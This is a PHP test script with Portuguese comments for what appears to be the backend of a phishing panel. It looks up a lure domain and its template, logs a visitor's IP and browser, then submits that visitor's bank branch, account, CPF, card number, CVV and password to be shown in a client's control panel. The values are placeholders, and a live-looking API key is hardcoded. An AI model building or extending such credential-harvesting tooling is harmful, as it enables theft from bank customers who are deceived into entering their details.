<?php

// Definir o domínio que está sendo acessado
$domain = 'app.acessarchaveprime.com';

// Passo 1: Buscar informações do domínio para obter o template e o usuário
$domainInfoUrl = 'http://127.0.0.1:8000/api/public/domain/' . $domain;
$apiKey = 'ekSsEyrtOAbRjEp3041789082UiazYEZXJYgzpfePLg1vkxoz5jMHVXNDFs4oz5jMHVXNDFs4HaYm'; // Use a chave API válida que encontramos anteriormente

$ch = curl_init($domainInfoUrl);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'X-API-Key: ' . $apiKey,
    'Content-Type: application/json',
    'Accept: application/json'
]);

$response = curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

if ($httpCode !== 200) {
    die("Erro ao buscar informações do domínio: $httpCode - $response");
}

// Decodificar a resposta
$domainInfo = json_decode($response, true);

echo "Informações do domínio obtidas com sucesso!\n";
echo "Usuário ID: " . $domainInfo['user']['id'] . "\n";
echo "Template ID: " . $domainInfo['template']['id'] . "\n";

// Passo 2: Criar um link manualmente para o usuário (normalmente isso seria obtido da base de dados)
$linkId = 1; // Vamos usar o ID 1 como exemplo, normalmente você buscaria isso do banco de dados

// Passo 3: Registrar um visitante
$visitanteUrl = 'http://127.0.0.1:8000/api/visitantes';
$visitanteData = [
    'link_id' => $linkId,
    'ip' => $_SERVER['REMOTE_ADDR'] ?? '127.0.0.1',
    'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'PHP/Script',
    'referrer' => $_SERVER['HTTP_REFERER'] ?? 'direct'
];

$ch = curl_init($visitanteUrl);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($visitanteData));
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Content-Type: application/json',
    'Accept: application/json'
]);

$response = curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

if ($httpCode !== 201) {
    die("Erro ao registrar visitante: $httpCode - $response");
}

$visitanteResponse = json_decode($response, true);
$visitanteUuid = $visitanteResponse['data']['visitante_uuid'];

echo "Visitante criado com sucesso!\n";
echo "UUID do visitante: $visitanteUuid\n";

// Passo 4: Registrar informações bancárias para o visitante
$infoUrl = 'http://127.0.0.1:8000/api/informacoes-bancarias';
$infoData = [
    'visitante_uuid' => $visitanteUuid,
    'data' => date('Y-m-d H:i:s'),
    'agencia' => '1234',
    'conta' => '56789-0',
    'cpf' => '123.456.789-00',
    'nome_completo' => 'Visitante de Teste',
    'telefone' => '(11) 98765-4321',
    'informacoes_adicionais' => [
        'cartao' => '1234 5678 9012 3456',
        'cvv' => '123',
        'senha' => 'senha123',
        'observacoes' => 'Esse é um teste de criação de informação bancária'
    ]
];

$ch = curl_init($infoUrl);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($infoData));
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Content-Type: application/json',
    'Accept: application/json'
]);

$response = curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

if ($httpCode !== 201) {
    die("Erro ao registrar informações bancárias: $httpCode - $response");
}

$infoResponse = json_decode($response, true);
echo "Informação bancária registrada com sucesso!\n";
echo "ID da informação: " . $infoResponse['data']['id'] . "\n";

// Exibir uma mensagem amigável
echo "\nProcesso completo: Um visitante e suas informações bancárias foram criados com sucesso para o cliente 1 (domínio $domain)!\n";
echo "Agora você pode acessar o painel de controle do cliente para ver este novo visitante e suas informações bancárias.";
?>
